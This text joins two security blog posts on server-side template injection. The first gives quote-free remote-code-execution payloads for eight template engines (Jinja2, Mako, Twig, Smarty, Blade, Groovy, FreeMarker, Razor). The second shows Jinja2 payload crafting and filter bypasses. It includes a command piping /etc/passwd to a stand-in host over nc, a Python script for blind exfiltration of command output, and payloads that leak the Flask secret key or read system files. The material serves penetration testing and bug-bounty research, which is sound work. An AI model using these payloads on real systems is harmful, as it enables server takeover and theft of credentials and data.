

Limitations are just an illusion - advanced server-side template exploitation with RCE everywhere
August 27, 2024

##
#
https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
#
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
#
##

server-side template injection
This article explains some novel techniques for exploiting server-side template injections (SSTIs) with complex, unique payloads that leverage default methods and syntax from various template engines. Even better, we will show how to do so without needing any quotation marks or extra plugins within the templates. All server-side template injection payloads detailed below can achieve remote code execution (RCE) on the target applications.

By default, many template engines have auto-escape enabled or perform HTML escape before the template rendering process. This sometimes makes our exploitation scenario much more difficult because of quote filtering used to render string-based data. Without string-based data in some form, RCE is significantly harder to achieve for some template engines, Twig being a notable example. For others, however, exploitation remains relatively simple even without the use of quotation marks. Our Jinja2 exploit was simplified, for instance, by the availability of the chr Python function.

Outline
Goal
Template engines
Exploitation and payload development
Jinja2
Mako
Twig
Smarty
Blade
Groovy
FreeMarker
Razor
Research roadmap
Acknowledgments
Goal
The goal of our research was simple: to create payloads for some of the most popular template engines with the impact being an RCE. The payloads should not rely on any resources, such as HTTP parameters, outside of the payload itself. Achieving this would ensure the payload works in as many exploitation scenarios as possible.

Template engines
Our research attempted to achieve a payload in relation to our goal on the following template engines:

Jinja2 (Python)
Mako (Python)
Twig (PHP)
Smarty (PHP)
Blade (PHP)
Groovy (Java)
FreeMarker (Java)
Razor (.NET)
Exploitation and payload development
As we said before, all payloads use only the default functions and methods from the template engine and don’t take advantage of any quotes or resources available outside the template engine itself, such as parameters in the HTTP request. Despite these limitations, all payloads can be used to achieved a RCE on an application vulnerable to a server-side template injection.

Jinja2
Jinja2, the default template engine used within Flask, is very powerful since it makes it possible to write and execute pure Python code.

To write a simple string, we can write this payload (note: index values may vary):

{{self.__init__.__globals__.__str__()[1786:1788]}}
The payload takes advantage of self.__init__.__globals__, which contains all global variables accessible to that function. This is then converted to a string with the help of the __str__ method. To build our string, we take advantage of index positions 1786 and 1788 from the converted __globals__ string, which finally returns the string: id.

We can now leverage this technique to build a payload that performs a remote code execution and runs system command id:

{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
A similar payload structure can be used to exploit one of the Dojo challenges - Coffee Shop that used Jinja2 as it's template engine and filtered out all quotation marks.

Mako
Mako is another template engine compatible with Python and is used by default by Python frameworks Pyramid and Pylons.

In Mako, a payload such as the one below will generate the string id:

${str().join(chr(i)for(i)in[105,100])}
We can then use this crafted string within Python’s os.popen function to achieve RCE:

${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
Although you could also use a payload like the one below, it requires the use of "less-than" (&lt;) and "greater-than" (&gt;) characters – putting it outside the scope of our research objective:

<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
Twig
Twig, the PHP template engine, was one of the most challenging template engines to find a working payload for. The biggest challenge of all was making a string from its built-in and default configurations.

Fortunately, I managed to craft a payload by leveraging the block feature and built-in _charset variable. Finally, I nested them together, which resulted in a successful payload:

{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
I also discovered an interesting payload that takes advantage of the built-in _context variable.

This payload allows you to achieve RCE if a template engine has performed a double rendering process.

{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
Smarty
In PHP template engine Smarty, we can take advantage of the chr function to generate a string based on the Hexadecimal value. We then use the variable modifier cat to concatenate our other generated chars and complete the string. The resulting string id is as follows:

{chr(105)|cat:chr(100)}
Similar to Twig, we can use the function passthru to execute our generated string and achieve RCE:

{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
Blade
Blade is the default template engine for the Laravel framework. We can use the chr function to convert hexadecimal values to characters, insert the characters into an array map, and use implode to join all generated characters into a string.

The following code generates the string id that will be used in our final payload:

{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}
Combined with the string generated from our previous payload, we can use passthru to execute the id command, which results in remote code execution:

{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
Groovy
Groovy is a Java-based template engine mainly used in the Grails framework. It’s a powerful engine. In Groovy, you can craft a string using either of the following methods:

${((char)105).toString()+((char)100).toString()}
Or:

${x=new String();for(i in[105,100]){x+=((char)i)}}
We can then use the execute function to run the resulting string-based command as a system command:

${x=new String();for(i in[105,100]){x+=((char)i).toString()};x.execute().text}
If you prefer the payload to have no spaces, you can always use a multi comment (/**/) as an alternative:

${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
FreeMarker
FreeMarker is a popular template engine used in Java-based applications and is supported by a variety of frameworks, including Spring and Apache struts.

Our efforts to generate a suitable string in FreeMarker led to the discovery of a pretty neat function: lower_abc. This function converts int based values into a string – but not in the way you might expect from functions such as chr in Python, as the documentation for lower_abc explains:


Converts 1, 2, 3, etc., to the string "a", "b", "c", etc. When reaching "z", it continues like "aa", "ab", etc. This is the same logic that you can see in column labels in spreadsheet applications (like Excel or Calc). The lowest allowed number is 1. There's no upper limit. If the number is 0 or less or it isn't an integer number then the template processing will be aborted with error.

So if you wanted a string that represents the letter "a", you could use the payload:

${1?lower_abc}
The string "aa", meanwhile, can be generated with the payload:

${27?lower_abc}
By using this method, you can build a string that can be used to create a payload such as the following, with the impact being RCE:

${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
Razor
Built into ASP.NET core, Razor is a powerful template engine that can run pure C# code. The ability to generate a string by taking full advantage of the C# programming language opens up a wide range of payload possibilities.

For instance, the following payload generates the string whoami:

@{string x=null;int[]l={119,104,111,97,109,105};foreach(int c in l){x+=((char)c).ToString();};}@x
If you then want to run this command as a system command, you can use @System.Diagnostics.Process.Start and replace _PROGRAM_ with the program type, such as cmd.exe, and replace _COMMAND_ with your generated string command:

@System.Diagnostics.Process.Start(_PROGRAM_,_COMMAND_);
Research roadmap
Achieving RCE in various popular template engines in this manner – with unique payloads that use only built-in methods/functions – shows just how much you can do with a program even when limited to using minimal resources.

There are still plenty of template engines that I personally have yet to investigate. For anyone interested in building on my research, I believe there are payloads following the same structure that could also achieve RCE in the template engines not covered here. I would say that is a good way to start.

Acknowledgments
A big thank you to the template Injection playground made by Hackmanit! They made the payload testing a lot easier!

Finally, I would like to thank the guys at SCH Tech for their research: RAZOR PAGES SSTI & RCE and James Kettle for his research on Server-Side Template Injection.




Server Side Template Injection with Jinja2 for you
Join Gus on a deep dive into crafting Jinja2 SSTI payloads from scratch. Explore bypass methods and various exploitation techniques in this insightful post.

Get an instant pentest quote now

Gus Ralph
Gus Ralph
Penetration Tester
April 29, 2020
What is a SSTI?
A server side template injection is a vulnerability that occurs when a server renders user input as a template of some sort. Templates can be used when only minor details of a page need to change from circumstance to circumstance. For example, depending on the IP that accesses a site, the site may look like:

<h1>Welcome to the page!</h1>
<u>This page is being accessed from the remote address: {{ip}}</u>
Instead of creating a whole new page per person that accesses the site, it will simply render the remote address into the {{ip}} variable, while reusing the rest of the HTML for each person request the server receives to that endpoint.

This can be abused, since some template engines support some fairly complex functionality, that eventually allow for developers to run commands or file contents straight from the template.

So when the power to create and render templates is given to a user, it can lead to full access to the system, as the user running the webserver.

What is 'MRO'?
Method Resolution Order (MRO) is the order in which Python looks for a method in a hierarchy of classes. It plays a vital role in the context of multiple inheritance as single method may be found in multiple super classes.

class A:
    def process(self):
        print('A process()')

class B:
    def process(self):
        print('B process()')

class C(A, B):
    def process(self):
        print('C process()')

class D(C,B):
    pass

obj = D()
obj.process()

print(D.mro())
This script will output the following: [<class '__main__.D'>, <class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class 'object'>]

So we can use the MRO function to display classes, will come in extremely handy for building python SSTI Jinja2 payloads. If you dislike using the global_name.__class__.__mro__ format, you can also make use of __base__. For example: global_name.__class__.__base__.

Since MRO will list the order in which the hierarchy of classes will be handled, we can take advantage of the fact that it lists the classes, to select the one we want. On the other hand, with base, we will not get this opportunity, but it also means we can discard the use of the [1], that is used to select the object class in this payload for example: {{g.__class__.__mro__}} OR {{g.__class__.mro()}} OR {{g['__class__']['mro']()}} OR {{g['__class__']['__mro__']}}.

Essentially, {{g.__class__.__mro__[1]}} == {{g.__class__.__base__}}.

Simple testing example arena
Place following in app.py, then run python app.py

from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
    if request.args.get('c'):
        return render_template_string(request.args.get('c'))
    else:
        return "Bienvenue!"

if __name__ == "__main__":
    app.run(debug=True)
Installation
sudo apt-get install python-pip
pip install flask --user
python app.py
Playtime
This section is purely made up of things I have found while playing with the basic SSTI playground that is attached above. It also includes some methods that can be used to clean up, shorten, decrease character variety, or make the payloads more comfortable to use.

RCE bypassing as much as I possibly can.
I initially built the following payload for remote command execution, and will now try and apply as many filter bypasses as I can. {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

If the waf blocks ".": {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}

If the waf blocks "." and "_": {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}

Bypassing the blocks on ".", "_", "[]" and "|join" makes the payload turn into this payload I made for PayloadAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twitter.com/SecGus/status/1249744031392940033): {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

RCE without using {{}}.
Since we know how to build RCE SSTI payloads for Jinja2 now, we notice that one thing seems to repeat itself throughout every payload. The open and close tags for the template ({{}}), so surely, if we block these tags from user input, we are safe?

{{}} is not the only way to define the start of a template, if you are familiar with development in Jinja2 templates, you will know there are another two ways.

One of the methods mentioned in the documentation is via the use of hashtags:

Since Jinja 2.2, line-based comments are available as well. For example, if the line-comment prefix is configured to be ##, everything from ## to the end of the line is ignored (excluding the newline sign):

# for i in request.args:
    <li>{{ i }}</li>
# endfor
The reason this was not looked into as much as the other method is due to it needing an explicit option being enabled on the app. Which happens to be the line_statement_prefix option that can be found documented here (thank you makelaris for clarifying this for me).

The other method I know of to make the "render_template_string()" function detect the start and end of a template is by using {% %}.

These are generally used for iterations or conditionals, such as "for" or "if" statements. Then I had an idea, surely to make a comparison between the output of a function and a string, it needs to run the function? Maybe we can call the function in one of the comparison's parameters, which will allow us to run a command?

For this I made a simple if statement that can return True or False, regardless. {% if 'chiv' == 'chiv' %} a {% endif %}

Now, if we start messing with the parameters, how about we put my RCE payload (request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()) into one of the comparison values. Surely the server needs to run the function if it wants to compare their outputs? {% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() == 'chiv\n' %} a {% endif %}

By using a similar methodology to blind SQL injections, we can verify if the command is run with the "sleep" command. Let's make the server sleep for 5 seconds. {% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('sleep 5')['read']() == 'chiv' %} a {% endif %}

Bingo! The server response time is increased and delayed. We seem to have command execution, but no way of exfiltrating data (you could take advantage of the fact that it is a binary comparison, either returning True or False, to leak command input byte by byte, but we have a VPS, so we can use HTTP to exfiltrate data).

{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}
RCE

For this part of the blog, if you want a bit of a challenge based on blind output exfiltration, I recommend you try and produce a payload that allows you to exfiltrate command output via the binary if statement. The way I would personally do this would be by making use of the ord() function on each character of the output, and the gt or lt operator to help indicate what the selected output letter is.

import requests, time, string

dictionary = string.printable
URL = "http://localhost:5000/"
final = ""
command = raw_input('What command should I run?\n')


while True:
        for x in dictionary:
                x = final + x
                r = requests.get(url = URL + "/?c={% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('" + command + "')['read']().startswith('" + str(x) + "') %}yes{% endif %}")
                if 'yes' in r.text:
                        final = x
                        print "Command output: " + final
                        break
                else:
                        pass
Which will eventually leak the output of the inputted command, in my I ran "id", and got the following output: https://twitter.com/SecGus/status/1250415032476860416

Leak the secret key used to sign session cookies.
By calling the config object, it returns a list of key value pairs, one being the secret key used to sign user cookies. So we can specify the SECRET_KEY, name pair and it will return the secret key value. {{config["SECRET_KEY"]}}

If the "config" object is blocked or "config" is blacklisted then you can also use the self object, although you will have to CTRL+F for the 'SECRET_KEY': {{self.__dict__}}

Bypass the |join filter, using format string.
This is python! Flexibility and simplicity should always be kept in mind. For this reason, we can use an extremely useful feature that comes as a filter for the flask templates: the format string feature.

An exemplar payload would be the following: {{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_

This basically tells the template to use the request object, and then builds the attribute we want to request from the request object (__class__) using arguments that are passed outside of the GET parameter that will be checked by the waf.

So as a base, we have: {{request|attr(request.args.f)}}&f=%s%sclass%s%s Which would be the equivalent of {{request|attr('%s%sclass%s%s')}}. We then pipe it to the format filter, as so: {{request|attr('%s%sclass%s%s'|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&a=_

This tells python to replace any "%s" with its according character. We pass it the value stored in the GET parameter called "a", which happens to be "_".

Summary explanation:

{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
{{request|attr('%s%sclass%s%s'|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&a=_
{{request|attr('%s%sclass%s%s'|format('_','_','_','_'))}}&a=_
{{request|attr('__class__'}}
Listing all classes & types through template.
This makes use of the class attribute along with python's method resolution order and the subclasses function to list all subclasses. {{OBJECT.__class__.mro().__subclasses__()}} {{OBJECT.__class__.__mro__[1].__subclasses__()}} {{OBJECT.__class__.__base__.__subclasses__()}} Where OBJECT can be a variety of things, for example:

g
request
get_flashed_messages
url_for
config
application
Payload development from 0
For any kind of payload development, you need to start by deciding what you want your main goal to be. We are going to go choose the initial object "get_flashed_messages" to work on.

We can start by confirming the function exists: {{get_flashed_messages}} We get <function get_flashed_messages at 0x7f0932ca15d0> back from the webserver, confirming it was recognised as a function being rendered as a template by the webserver. This is also a good way to confirm SSTI's, you can simply type {{g}} and the template should render as: <flask.g of 'PYTHON APP NAME'>.

Next, we can use the __class__ attribute to along with the __mro__ and subclasses function to list all classes within the app.

Final evolution:

{{get_flashed_messages}}
{{get_flashed_messages.__class__}}
{{get_flashed_messages.__class__.__mro__}}
{{get_flashed_messages.__class__.__mro__[1]}}
{{get_flashed_messages.__class__.__mro__[1].__subclasses__()}}
{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]}}
{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd')}}
{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
Python Literal Hex Encoding
Usage
This literal encoding will only work in quoted strings. This means that if a WAF blocks characters that are only common in filenames, or commands, and not in the SSTI payload itself, you can use these to encode the string and bypass the WAF. For example, if / was blocked, you could substitute it for a \x2F.

Examples
URL: http://127.0.0.1:5000/?c={{%22\x41%22}} Returns: A

This means we can convert:

{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
Into:

{{''.__class__.__mro__[2].__subclasses__()[40]('\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64').read()}}
Other examples (this makes use of the hex literals, but also of the decode from hex function):

{% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
    {%endif%}
{%endfor%}
Can be converted to:

{% for a in []["5F5F636C6173735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F626173655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F737562636C61737365735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]() %}
    {% if "7761726E696E67"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78") in a["5F5F6E616D655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")] %}
        {{a()["5F6D6F64756C65"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F6275696C74696E735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F696D706F72745F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6F73"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["706F70656E"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6563686F2024666C6167"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["72656164"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]()}}
    {%endif%}
{%endfor%}
Dot WAF bypass
Usage
A common WAF character block is on .s, which are what a lot of the time are expected to be a necessary part of calling an object's attributes. This is not necessarily true, and there are multiple ways around it. One being the use of "[]" instead of dots. Here we can see some relevant documentation pulled directly from the template development page (see references):

You can use a dot (.) to access attributes of a variable in addition to the
standard Python __getitem__ “subscript” syntax ([]).

The following lines do the same thing:

{{ foo.bar }}
{{ foo['bar'] }}
Another way we can bypass the use of "."s is throught he previously mentioned |attr filter.

Examples
This also means we can convert something like: {{ ''.__class__.__mro__[2].__subclasses__() }} Into: {{''['__class__']['__mro__'][2]['__subclasses__']()}}

Which completely removes the need / use of dots.

Possibly relevant notes
List of filters provided by Flask
A list of all possible filters can be found in the Flask documentation (https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters). Filters can be used for a variety of things, for example, the join() filter can be used to join all strings in a list together, like this: {{['Thi','s wi','ll b','e appended']|join}} will return This will be appended.

Another example of a potentially useful filter could be the safe() filter. This filter allows us to inject JavaScript and HTML into the page without it being HTML encoded (since Flask does this by default). What this means is, inputting the template {{'<script>alert(1);</script>'}} would automatically HTML encode the special characters, turning it into &lt;script&gt;alert(1);&lt;/script&gt;, meaning the alert box won't trigger, and we will just be returned the string rendered back to us. If you pipe the string to the "safe" filter, it returns the string as it is, without HTML encoding the output ({{'<script>alert(1);</script>'|safe}} would trigger an alert box).

List all attributes associated to an object using dict.
In python, you can use __dict__ to list all attributes associated to an object, this is good for once we have selected our subclass to explore, and want to see what branches we could go down.

For example this will list all attributes associated to the 290th subclass in the list: {{g.__class__.__mro__[1].__subclasses__()[289].__dict__}}

Furthermore, since dictionaries are made up of key-value pairs, you can tell the template to only return the keys, or only return the values with .keys() or .values(). For example: {{['view_args'].__class__.__subclasses__()[13].__dict__.keys()}} {{request['view_args'].__class__.__subclasses__()[13].__dict__.values()}}

Example base objects to use
https://github.com/pallets/flask/blob/38eb5d3b49d628785a470e2e773fc5ac82e3c8e4/src/flask/app.py#L775-L786 (thank you again makelaris for bringing this to my attention)

rv.globals.update(
            url_for=url_for,
            get_flashed_messages=get_flashed_messages,
            config=self.config,
            # request, session and g are normally added with the
            # context processor for efficiency reasons but for imported
            # templates we also want the proxies in there.
            request=request,
            session=session,
            g=g,
        )
Difference between foo.bar and foo['bar'] when being handled by flask
For the sake of convenience, foo.bar in Jinja does the following things on the Python layer:

check for an attribute called bar on foo (getattr(foo, 'bar'))
if there is not, check for an item 'bar' in foo (foo.__getitem__('bar'))
if there is not, return an undefined object.
foo['bar'] works mostly the same with a small difference in sequence:

check for an item 'bar' in foo. (foo.__getitem__('bar'))
if there is not, check for an attribute called bar on foo. (getattr(foo, 'bar'))
if there is not, return an undefined object.
This is important if an object has an item and attribute with the same name. Additionally, the attr() filter only looks up attributes.

Conclusion & Contact
I hope this post clarified certain concepts, and helps people get into SSTI payloads for Jinja2, as they are extremely satisfying to make. If any further information is needed, do not hesitate to contact me at: https://twitter.com/SecGus

References
https://jinja.palletsprojects.com/en/2.11.x/templates/
https://portswigger.net/research/server-side-template-injection
https://medium.com/bugbountywriteup/x-mas-2019-ctf-write-up-mercenary-hat-factory-ssti-53e82d58829e
https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters
https://jinja.palletsprojects.com/en/2.11.x/api/#jinja2.Environment
